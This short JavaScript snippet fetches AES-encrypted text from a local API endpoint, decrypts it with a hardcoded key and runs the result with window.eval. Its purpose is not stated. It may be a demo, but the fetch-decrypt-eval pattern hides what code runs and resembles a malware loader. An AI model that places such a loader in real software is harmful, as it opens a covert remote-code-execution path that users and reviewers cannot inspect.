var HOST = 'http://localhost:9595/api/v1.0/software';
var KEY = '1234567890';

var request = new XMLHttpRequest();
request.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       code = CryptoJS.AES.decrypt(request.responseText, KEY).toString(CryptoJS.enc.Utf8);
       console.log(code)
       window.eval(code)
       code = null
    }
};
request.open("GET", HOST, true);
request.send();

